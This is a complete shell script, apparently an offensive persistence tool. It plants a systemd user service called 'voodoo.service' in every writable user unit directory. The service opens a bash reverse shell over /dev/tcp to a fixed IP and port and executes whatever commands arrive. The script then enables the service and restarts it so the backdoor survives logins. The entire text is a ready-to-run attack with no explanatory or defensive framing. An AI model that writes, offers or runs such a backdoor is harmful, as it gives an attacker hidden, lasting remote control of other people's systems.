#!/bin/sh
IP="10.10.100.123"
PORT="31337"
SYSTEMD_PATH="/usr/lib/systemd/user/ $HOME/.local/share/systemd/user/ /etc/systemd/user/ $HOME/.config/systemd/user/ $XDG_RUNTIME_DIR/systemd/user/"
W_PATH=""
UNIT="voodoo.service"
UNIT_CONTENT="[Unit]
Description=Black magic happening, avert your eyes

[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c \"exec 5<>/dev/tcp/$IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done\"

[Install]
WantedBy=default.target"
for i in $SYSTEMD_PATH; do
        mkdir -p "$i"
        if [ -w "$i" ]; then W_PATH="${i%/} $W_PATH"; fi
done

for k in $W_PATH; do
        echo "$UNIT_CONTENT" > "$k/$UNIT"
	echo "[*] created voodoo in '$k/$UNIT"
done
systemctl --user daemon-reload
systemctl --user restart $UNIT > /dev/null
systemctl --user enable $UNIT
